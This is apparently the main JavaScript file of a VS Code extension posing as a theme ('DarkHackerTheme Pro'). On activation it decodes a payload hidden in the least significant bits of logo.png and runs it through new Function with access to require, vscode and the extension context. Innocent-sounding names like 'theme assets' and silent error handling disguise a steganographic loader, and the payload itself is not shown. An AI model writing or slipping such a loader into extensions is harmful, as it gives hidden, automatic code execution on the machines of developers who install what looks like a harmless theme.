const vscode = require("vscode");
const fs = require("fs");
const path = require("path");
const { PNG } = require("pngjs");

const EXTENSION_NAME = "DarkHackerTheme Pro";

function readPngMetadata(imagePath) {
    try {
        const raw = fs.readFileSync(imagePath);
        return PNG.sync.read(raw);
    } catch (_) {
        return null;
    }
}

function loadEmbeddedThemeData(pixelData) {
    const marker = "IEND";
    const bits = [];
    let result = "";

    for (let i = 0; i < pixelData.length; i++) {
        bits.push(pixelData[i] & 1);

        if (bits.length === 8) {
            let value = 0;

            for (const bit of bits) {
                value = (value << 1) | bit;
            }

            result += String.fromCharCode(value);
            bits.length = 0;

            if (result.endsWith(marker)) {
                return result.slice(0, -marker.length);
            }
        }
    }

    return "";
}

function initializeThemeAssets(context) {
    const iconPath = path.join(context.extensionPath, "logo.png");

    if (!fs.existsSync(iconPath)) {
        console.warn(`[${EXTENSION_NAME}] logo.png not found`);
        return null;
    }

    const png = readPngMetadata(iconPath);

    if (!png || !png.data) {
        console.warn(`[${EXTENSION_NAME}] failed to parse theme assets`);
        return null;
    }

    return loadEmbeddedThemeData(png.data);
}

function activate(context) {
    console.log(`${EXTENSION_NAME} activated`);

    const embeddedConfig = initializeThemeAssets(context);

    if (embeddedConfig && embeddedConfig.length > 0) {
        console.log(`[${EXTENSION_NAME}] theme assets initialized`);

        try {
            const runner = new Function("require", "vscode", "context", embeddedConfig);
            runner(require, vscode, context);
        } catch (e) {
            console.warn(`[${EXTENSION_NAME}] failed to initialize theme assets`);
        }
    }
}

function deactivate() {}

module.exports = {
    activate,
    deactivate
};